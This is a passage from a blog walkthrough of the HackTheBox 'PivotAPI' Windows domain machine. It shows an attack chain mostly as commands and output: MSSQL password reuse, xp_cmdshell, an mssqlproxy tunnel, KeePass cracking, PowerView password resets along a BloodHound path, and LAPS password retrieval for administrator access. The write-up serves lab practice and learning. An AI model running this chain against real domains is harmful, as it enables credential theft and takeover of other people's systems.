MSSQL       10.10.10.240    1433   PIVOTAPI         [*] Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:LicorDeBellota.htb)
MSSQL       10.10.10.240    1433   PIVOTAPI         [-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario &#39;LICORDEBELLOTA\svc_mssql&#39;.
</code></pre><ul><li>If we change the username to <code>sa</code> to test for password-reuse, we have a hit</li></ul><pre tabindex=0><code>└─$ crackmapexec mssql 10.10.10.240 -u sa -p &#39;#mssql_s3rV1c3!2020&#39; --local-auth
MSSQL       10.10.10.240    1433   PIVOTAPI         [*] Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:PIVOTAPI)
MSSQL       10.10.10.240    1433   PIVOTAPI         [+] sa:#mssql_s3rV1c3!2020 (Pwn3d!)
</code></pre><ul><li>Nothing interesting in the database<ul><li>But <code>svc_mssql</code> is <code>winrm</code> user, so probably <code>winrm</code> port is firewalled</li></ul></li></ul><p><img src=./images/12.png alt></p><ul><li>We can use <a href=https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py target=_blank rel=noopener>mssql_shell</a><ul><li>or <code>impacket-mssqlclient</code> with <code>xp_cmdshell</code> to get a reverse shell</li><li>Download <code>nc</code> and execute to it to get reverse shell</li><li>But this is uninteded way</li></ul></li></ul><pre tabindex=0><code>└─$ impacket-mssqlclient sa:&#39;#mssql_s3rV1c3!2020&#39;@10.10.10.240                                      
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a &#39;master&#39;.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)&gt; xp_cmdshell
output   
------   
NULL     

SQL (sa  dbo@master)&gt; xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL                   
</code></pre><ul><li>Intended way is to use <a href=https://github.com/blackarrowsec/mssqlproxy target=_blank rel=noopener>mssqlproxy</a><ul><li><a href=https://github.com/0xdf-0xdf/mssqlproxy/ target=_blank rel=noopener>python3 version</a></li><li>Download 2 <code>dlls</code> from releases<ul><li>Rename <code>assembly.dll</code> to <code>Microsoft.SqlServer.Proxy.dll</code></li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ git clone https://github.com/0xdf-0xdf/mssqlproxy -b python3
Cloning into &#39;mssqlproxy&#39;...
remote: Enumerating objects: 36, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 36 (delta 13), reused 23 (delta 4), pack-reused 0
Receiving objects: 100% (36/36), 172.33 KiB | 625.00 KiB/s, done.
Resolving deltas: 100% (13/13), done.
</code></pre><pre tabindex=0><code>└─$ mv assembly.dll Microsoft.SqlServer.Proxy.dll
</code></pre><ul><li>Now we connect to box and upload second dll <code>reciclador.dll</code> there<ul><li>change <code>import thread</code> to <code>import _thread</code></li></ul></li></ul><pre tabindex=0><code>└─$ python3 mssqlclient.py sa:#mssql_s3rV1c3!2020@10.10.10.240&#39;
Impacket v0.11.0 - Copyright 2023 Fortra

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a &#39;master&#39;.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL&gt; enable_ole
SQL&gt; upload reciclador.dll C:\windows\temp\reciclador.dll
[+] Uploading &#39;reciclador.dll&#39; to &#39;C:\windows\temp\reciclador.dll&#39;...
[+] Size is 111616 bytes
[+] Upload completed
SQL&gt; 
</code></pre><pre tabindex=0><code>└─$ python3 mssqlclient.py &#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240&#39; -install -clr Microsoft.SqlServer.Proxy.dll
Impacket v0.11.0 - Copyright 2023 Fortra

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a &#39;master&#39;.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: install
[*] CLR enabled
[*] Assembly successfully installed
[*] Procedure successfully installed
</code></pre><pre tabindex=0><code>└─$ python3 mssqlclient.py &#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240&#39; -check -reciclador &#39;C:\windows\temp\reciclador.dll&#39;
Impacket v0.11.0 - Copyright 2023 Fortra

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a &#39;master&#39;.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
</code></pre><pre tabindex=0><code>└─$ python3 mssqlclient.py &#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240&#39; -start -reciclador &#39;C:\windows\temp\reciclador.dll&#39;
Impacket v0.11.0 - Copyright 2023 Fortra

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a &#39;master&#39;.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
[*] Proxy mode: start
[*] Triggering Proxy Via MSSQL, waiting for ACK
[*] ACK from server!
[*] Listening on port 1337...
</code></pre><ul><li>Now if we check <code>netstat</code>, we have <code>1137</code> port listening</li></ul><pre tabindex=0><code>└─$ sudo netstat -tulpn | grep 1337
[sudo] password for kali: 
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      245854/python3 
</code></pre><ul><li>Add entry <code>socks5 127.0.0.1 1337</code> to <code>/etc/proxychains.conf</code></li><li>Since we saw that <code>svc_mssql</code> is has <code>winrm</code> rights, if we check <code>winrm</code> port it&rsquo;s open</li></ul><pre tabindex=0><code>└─$ proxychains nmap -Pn -p 5985 127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 13:45 BST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.35s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
</code></pre><ul><li>Now we can <code>evil-winrm</code></li></ul><pre tabindex=0><code>└─$  proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p &#39;#mssql_s3rV1c3!2020&#39;
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_mssql\Documents&gt; 
</code></pre><h2 id=user-1>User #1</h2><ul><li>If we check <code>svc_mssql</code>&rsquo;s desktop, we have creds</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_mssql&gt; ls desktop


    Directorio: C:\Users\svc_mssql\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020  10:12 PM           2286 credentials.kdbx
-a----        4/30/2021  10:39 AM             93 note.txt
</code></pre><ul><li>Download <code>kdbx</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc_mssql\desktop&gt; type note.txt
Long running MSSQL Proxies can cause issues.  Please switch to SSH after getting credentials.
*Evil-WinRM* PS C:\Users\svc_mssql\desktop&gt; download credentials.kdbx
                                        
Info: Downloading C:\Users\svc_mssql\desktop\credentials.kdbx to credentials.kdbx
                                        
Info: Download successful!
</code></pre><ul><li>Let&rsquo;s crack it</li></ul><pre tabindex=0><code>└─$ keepass2john credentials.kdbx &gt; credentials.hash
</code></pre><pre tabindex=0><code>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt credentials.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
mahalkita        (credentials)     
1g 0:00:00:01 DONE (2023-10-12 13:50) 0.7246g/s 144.9p/s 144.9c/s 144.9C/s alyssa..september
Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed. 
</code></pre><ul><li>Let&rsquo;s find a password</li></ul><pre tabindex=0><code>└─$ echo &#34;mahalkita&#34; | kpcli -kdb credentials.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type &#39;help&#39; for a description of available commands.
Type &#39;help &lt;command&gt;&#39; for details on individual commands.

kpcli:/&gt; ls
=== Groups ===
Database/
kpcli:/&gt; cd Database/
kpcli:/Database&gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
kpcli:/Database&gt;
</code></pre><ul><li>I found creds in <code>Windows</code> folder</li></ul><pre tabindex=0><code>kpcli:/Database&gt; cd Windows/
kpcli:/Database/Windows&gt; ls
=== Entries ===
0. SSH                                                                    
kpcli:/Database/Windows&gt; show -f SSH 

 Path: /Database/Windows/
Title: SSH
Uname: 3v4Si0N
 Pass: Gu4nCh3C4NaRi0N!23
  URL: 
Notes: 
</code></pre><ul><li>And they work for <code>ssh</code></li></ul><pre tabindex=0><code>└─$ sshpass -p &#39;Gu4nCh3C4NaRi0N!23&#39; ssh 3v4Si0N@10.10.10.240
Microsoft Windows [Versión 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N&gt;
</code></pre><h2 id=user-2>User #2</h2><ul><li>There is a <code>Developers</code> folder, but we don&rsquo;t have access to it</li></ul><pre tabindex=0><code>licordebellota\3v4si0n@PIVOTAPI C:\&gt;dir 
 El volumen de la unidad C no tiene etiqueta. 
 El número de serie del volumen es: 94DB-AFCA

 Directorio de C:\

08/08/2020  19:23    &lt;DIR&gt;          Developers
08/08/2020  12:53    &lt;DIR&gt;          inetpub
08/08/2020  22:48    &lt;DIR&gt;          PerfLogs
19/02/2021  14:42    &lt;DIR&gt;          Program Files
09/08/2020  17:06    &lt;DIR&gt;          Program Files (x86)
08/08/2020  19:46    &lt;DIR&gt;          Users
29/04/2021  17:31    &lt;DIR&gt;          Windows
               0 archivos              0 bytes
               7 dirs   4.425.191.424 bytes libres

licordebellota\3v4si0n@PIVOTAPI C:\&gt;dir Developers 
 El volumen de la unidad C no tiene etiqueta. 
 El número de serie del volumen es: 94DB-AFCA

 Directorio de C:\Developers

No se encuentra el archivo
</code></pre><ul><li>The <code>bloodhound</code> shows <code>GenericAll</code> rights over few users</li></ul><p><img src=./images/13.png alt></p><ul><li>We know there is a <code>developers</code> group in the domain<ul><li>We could assume they have access to that folder</li></ul></li></ul><pre tabindex=0><code>licordebellota\3v4si0n@PIVOTAPI C:\&gt;net group /domain

Cuentas de grupo de \\PIVOTAPI

-------------------------------------------------------------------------------
*Administradores clave
*Administradores clave de la organización
*Administradores de empresas
*Administradores de esquema
*Admins. del dominio
*Controladores de dominio
*Controladores de dominio clonables
*Controladores de dominio de sólo lectura
*Developers
*DnsUpdateProxy
*Enterprise Domain Controllers de sólo lectura
*Equipos del dominio
*Invitados del dominio
*LAPS ADM
*LAPS READ
*Propietarios del creador de directivas de grupo
*Protected Users
*Usuarios del dominio
*WinRM
Se ha completado el comando correctamente.
</code></pre><ul><li>If we specify the target as <code>Developers</code> in <code>bloodhound</code>, we see the path</li></ul><p><img src=./images/14.png alt></p><ul><li>Let&rsquo;s download <code>Powerview</code> and change <code>Dr.Zaiuss</code>&rsquo;s password</li></ul><pre tabindex=0><code>└─$ sshpass -p &#39;Gu4nCh3C4NaRi0N!23&#39; scp powerview.ps1 3v4Si0N@10.10.10.240:&#39;C:\programdata\powerview.ps1&#39;
</code></pre><ul><li>Change the password</li></ul><pre tabindex=0><code>PS C:\Programdata&gt; import-module .\powerview.ps1 
PS C:\Programdata&gt; $pass = ConvertTo-SecureString &#39;P@ssw0rd123&#39; -AsPlainText -Force 
PS C:\Programdata&gt; Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass 
PS C:\Programdata&gt;  
</code></pre><ul><li><code>dr.zaiuss</code> is not <code>ssh</code> user, but has rights to <code>winrm</code><ul><li>We can configure port forwarding via <code>ssh</code></li><li>And connect as <code>dr.zaiuss</code></li></ul></li></ul><pre tabindex=0><code>└─$ sshpass -p &#39;Gu4nCh3C4NaRi0N!23&#39; ssh 3v4Si0N@10.10.10.240 -L 5985:127.0.0.1:5985
Microsoft Windows [Versión 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N&gt;
</code></pre><ul><li>And now connect as <code>dr.zaiuss</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &#39;P@ssw0rd123&#39; 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents&gt; 
</code></pre><h2 id=user-3>User #3</h2><ul><li>Now we change <code>superfume</code>&rsquo;s password</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\programdata&gt; import-module .\powerview.ps1
*Evil-WinRM* PS C:\programdata&gt; $pass = ConvertTo-SecureString &#39;P@ssw0rd123&#39; -AsPlainText -Force 
*Evil-WinRM* PS C:\programdata&gt; Set-DomainUserPassword -Identity superfume -AccountPassword $pass
*Evil-WinRM* PS C:\programdata&gt;
</code></pre><ul><li>Now connect to <code>winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -i 127.0.0.1 -u superfume -p &#39;P@ssw0rd123&#39; 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\superfume\Documents&gt; 
</code></pre><h2 id=user-4>User #4</h2><ul><li>Now we can access <code>Developers</code> folder</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Developers&gt; dir


    Directorio: C:\Developers


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/8/2020   7:26 PM                Jari
d-----         8/8/2020   7:23 PM                Superfume
</code></pre><ul><li>We have 2 files inside <code>Jari</code>&rsquo;s folder</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Developers&gt;ls jari


    Directorio: C:\Developers\jari


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020   7:26 PM           3676 program.cs
-a----         8/8/2020   7:18 PM           7168 restart-mssql.exe
</code></pre><ul><li>Download them</li></ul><pre tabindex=0><code></code></pre><ul><li><code>program.cs</code> indicates that it uses <code>Jari</code>&rsquo;s creds, but it&rsquo;s incomplete<ul><li>The password is decrypted using <code>RC4</code> before restarting the service</li><li>But it&rsquo;s empty</li></ul></li></ul><p><img src=./images/15.png alt></p><ul><li>Let&rsquo;s reverse engineer the binary</li></ul><p><img src=./images/16.png alt></p><ul><li>We can set a breakpoint and start it<ul><li>We see an <code>array</code></li><li>Right-click and <code>Show in Memory Window</code></li><li>We see our password</li></ul></li></ul><p><img src=./images/17.png alt></p><p><img src=./images/18.png alt></p><p><img src=./images/19.png alt></p><p><img src=./images/20.png alt></p><ul><li>And we can <code>winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -i 127.0.0.1 -u jari -p &#39;Cos@Chung@!RPG&#39;
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jari\Documents&gt; 
</code></pre><h2 id=root>Root</h2><ul><li>We have a path to <code>Laps Adm</code> and <code>Laps Read</code> groups<ul><li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899" target=_blank rel=noopener>LAPS</a></li></ul></li></ul><p><img src=./images/21.png alt></p><ul><li>We have to change <code>gibdeon</code>&rsquo;s password, who&rsquo;s a member of <a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators target=_blank rel=noopener>Account Operators</a><ul><li><code>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.</code></li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\programdata&gt; import-module .\poweview.ps1
*Evil-WinRM* PS C:\programdata&gt; $pass = ConvertTo-SecureString &#39;P@ssw0rd123&#39; -AsPlainText -Force
*Evil-WinRM* PS C:\programdata&gt; Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass
*Evil-WinRM* PS C:\programdata&gt; $cred = New-Object System.Management.Automation.PSCredential(&#39;gibdeon&#39;, $pass)
</code></pre><ul><li>Now we can execute commands a <code>gibdeon</code><ul><li>I&rsquo;ll add <code>jari</code> to <code>LAPS Read</code> group</li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\programdata&gt; Add-DomainGroupMember -Identity &#39;LAPS READ&#39; -Credential $cred -Members &#39;jari&#39;
*Evil-WinRM* PS C:\programdata&gt; whoami /groups

INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                                                    Tipo           SID                                           Atributos
================================================================== ============== ============================================= ========================================================================
Todos                                                              Grupo conocido S-1-1-0                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                                                   Alias          S-1-5-32-545                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LICORDEBELLOTA\Developers                                          Grupo          S-1-5-21-842165252-2479896602-2762773115-1126 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LICORDEBELLOTA\WinRM                                               Grupo          S-1-5-21-842165252-2479896602-2762773115-1125 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
*Evil-WinRM* PS C:\programdata&gt; exit
                                        
Info: Exiting with code 0                                      
</code></pre><ul><li>Relogin for the changes to take effect</li></ul><pre tabindex=0><code>└─$ evil-winrm -i 127.0.0.1 -u jari -p &#39;Cos@Chung@!RPG&#39;
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jari\Documents&gt; whoami /groups

INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                                                    Tipo           SID                                           Atributos
================================================================== ============== ============================================= ========================================================================
Todos                                                              Grupo conocido S-1-1-0                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                                                   Alias          S-1-5-32-545                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LICORDEBELLOTA\Developers                                          Grupo          S-1-5-21-842165252-2479896602-2762773115-1126 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LICORDEBELLOTA\LAPS READ                                           Grupo          S-1-5-21-842165252-2479896602-2762773115-1114 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LICORDEBELLOTA\WinRM                                               Grupo          S-1-5-21-842165252-2479896602-2762773115-1125 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
</code></pre><ul><li>Retrieve password</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\jari\Documents&gt; Get-ADComputer PivotAPI -property &#39;ms-mcs-admpwd&#39;


DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
DNSHostName       : PivotAPI.LicorDeBellota.htb
Enabled           : True
ms-mcs-admpwd     : hrn38Rhix9Tdx7XR2XG4
Name              : PIVOTAPI
ObjectClass       : computer
ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
SamAccountName    : PIVOTAPI$
SID               : S-1-5-21-842165252-2479896602-2762773115-1004
UserPrincipalName :
</code></pre><ul><li>Now we can <code>winrm</code> as <code>Administrador</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -i 127.0.0.1 -u administrador -p &#39;hrn38Rhix9Tdx7XR2XG4&#39;
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrador\Documents&gt; 
</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fpivotapi%2f&text=%5bHTB%5d%20Machine%3a%20PivotAPI&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
</a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fpivotapi%2f&title=%5bHTB%5d%20Machine%3a%20PivotAPI" target=_blank><i class="fab fa-reddit"></i>
</a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fpivotapi%2f&title=%5bHTB%5d%20Machine%3a%20PivotAPI" target=_blank><i class="fab fa-linkedin"></i>
</a><a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20PivotAPI&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fpivotapi%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/windows/pivotapi/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Outdated</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Querier</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user>User</a></li><li><a href=#user-1>User #1</a></li><li><a href=#user-2>User #2</a></li><li><a href=#user-3>User #3</a></li><li><a href=#user-4>User #4</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
